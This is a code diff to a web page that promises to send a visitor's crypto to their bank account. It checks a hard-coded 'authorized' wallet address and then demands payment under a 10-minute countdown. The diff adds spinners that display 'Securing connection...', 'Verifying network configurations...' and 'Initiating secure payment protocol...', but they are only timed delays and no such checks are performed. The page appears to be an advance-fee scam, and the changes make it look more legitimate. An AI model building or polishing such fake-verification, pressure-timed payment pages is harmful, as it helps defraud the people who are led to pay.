@@ -30,6 +30,8 @@
             width: 100%;
             max-width: 450px;
             text-align: center;
+            position: relative; /* Added to keep spinner positioned inside the box */
+            overflow: hidden;
         }
 
         .step {
@@ -126,16 +128,57 @@
             margin: 20px 0;
             letter-spacing: 1px;
         }
+
+        /* --- LOADING SPINNER STYLES --- */
+        .spinner-overlay {
+            display: none; /* Hidden by default */
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(30, 41, 59, 0.95); /* Matches container background */
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 10;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #334155;
+            border-top: 5px solid #38bdf8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+
+        .spinner-text {
+            color: #94a3b8;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
 
+    <div class="spinner-overlay" id="loading-spinner">
+        <div class="spinner"></div>
+        <div class="spinner-text" id="spinner-message">Processing...</div>
+    </div>
+
     <div class="step active" id="step1">
         <h2>You’re one step away!</h2>
         <p>You are just a few moments away from securely receiving your crypto straight into your local bank account.</p>
-        <button class="btn" onclick="nextStep(2)">Proceed</button>
+        <button class="btn" onclick="triggerStep1Transition()">Proceed</button>
     </div>
 
     <div class="step" id="step2">
@@ -178,7 +221,7 @@
         <p style="margin-bottom: 5px;">Time remaining to complete payment:</p>
         <div class="timer" id="countdown">10:00</div>
 
-        <button class="btn" style="background-color: #10b981;" onclick="alert('Payment processing initiated!')">Pay Now</button>
+        <button class="btn" style="background-color: #10b981;" onclick="triggerPaymentProcessing()">Pay Now</button>
     </div>
 
 </div>
@@ -187,7 +230,21 @@
     // Defined Authorized Address
     const REQUIRED_ADDRESS = "0x7C3eFfee94c4D79A951FC51f62201bD88785ACF8";
 
-    // Function to switch between steps
+    // Helper function to handle spinner display
+    function showSpinner(text, duration, callback) {
+        const spinner = document.getElementById('loading-spinner');
+        const spinnerText = document.getElementById('spinner-message');
+        
+        spinnerText.innerText = text;
+        spinner.style.display = 'flex';
+
+        setTimeout(() => {
+            spinner.style.display = 'none';
+            if (callback) callback();
+        }, duration);
+    }
+
+    // Function to switch between steps directly
     function nextStep(stepNumber) {
         document.querySelectorAll('.step').forEach(step => {
             step.classList.remove('active');
@@ -195,7 +252,14 @@
         document.getElementById('step' + stepNumber).classList.add('active');
     }
 
-    // Process step 2 with strict wallet verification
+    // Step 1 button action with loader
+    function triggerStep1Transition() {
+        showSpinner("Securing connection...", 1500, () => {
+            nextStep(2);
+        });
+    }
+
+    // Process step 2 with strict wallet verification and loader
     function processStep2() {
         const address = document.getElementById('wallet-address').value.trim();
         const selectedCrypto = document.getElementById('crypto-select').value;
@@ -214,9 +278,18 @@
         // Pass selected crypto text to the final screen
         document.getElementById('display-crypto').innerText = selectedCrypto;
 
-        // Move to Step 3 and start timer
-        nextStep(3);
-        startTimer(600); // 10 minutes in seconds
+        // Show spinner before showing step 3
+        showSpinner("Verifying network configurations...", 1800, () => {
+            nextStep(3);
+            startTimer(600); // 10 minutes in seconds
+        });
+    }
+
+    // Step 3 payment confirmation with loader
+    function triggerPaymentProcessing() {
+        showSpinner("Initiating secure payment protocol...", 2000, () => {
+            alert('Payment processing initiated!');
+        });
     }
 
     // Countdown Timer Function
@@ -224,7 +297,10 @@
         let timer = duration, minutes, seconds;
         const display = document.getElementById('countdown');
         
-        const interval = setInterval(function () {
+        // Prevent stacking duplicate timers if function runs twice
+        if(window.timerInterval) clearInterval(window.timerInterval);
+
+        window.timerInterval = setInterval(function () {
             minutes = parseInt(timer / 60, 10);
             seconds = parseInt(timer % 60, 10);
 
@@ -234,7 +310,7 @@
             display.textContent = minutes + ":" + seconds;
 
             if (--timer < 0) {
-                clearInterval(interval);
+                clearInterval(window.timerInterval);
                 display.textContent = "EXPIRED";
                 alert("Time has expired! Please restart the transaction.");
             }
